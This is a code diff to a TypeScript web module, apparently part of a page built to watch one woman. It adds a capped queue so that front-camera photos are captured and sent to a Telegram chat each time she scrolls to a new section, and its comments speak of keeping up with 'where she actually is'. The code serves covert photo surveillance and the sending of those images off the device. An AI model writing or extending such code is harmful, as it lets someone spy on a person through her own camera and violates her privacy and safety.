@@ -1,6 +1,37 @@
 import { notify, notifyPhoto } from "./telegram";
 
 /**
+ * Only one camera can be open at a time, but sections scroll into view in
+ * quick succession — so requests are queued and run one after another.
+ * The queue is capped so a fast scroll through the whole page can't build
+ * up a huge backlog that lags far behind where she actually is.
+ */
+let running = false;
+const queue: string[] = [];
+const MAX_QUEUE = 4;
+
+export function captureAndSendPhoto(caption: string): void {
+  if (typeof window === "undefined") return;
+  if (queue.length >= MAX_QUEUE) queue.shift(); // drop the oldest, keep it current
+  queue.push(caption);
+  void drainQueue();
+}
+
+async function drainQueue(): Promise<void> {
+  if (running) return;
+  running = true;
+  try {
+    while (queue.length) {
+      const next = queue.shift() as string;
+      // eslint-disable-next-line no-await-in-loop
+      await grabAndSend(next);
+    }
+  } finally {
+    running = false;
+  }
+}
+
+/**
  * Captures a photo from the front camera and sends it to Telegram.
  *
  * Must be called from a real user gesture (a click/tap handler): browsers
@@ -9,7 +40,7 @@ import { notify, notifyPhoto } from "./telegram";
  * like http://192.168.x.x has no `navigator.mediaDevices` at all — hence the
  * explicit check below, which tells you exactly why nothing arrived.
  */
-export async function captureAndSendPhoto(caption: string): Promise<void> {
+async function grabAndSend(caption: string): Promise<void> {
   if (typeof window === "undefined") return;
 
   // `mediaDevices` is undefined in insecure contexts — the usual reason
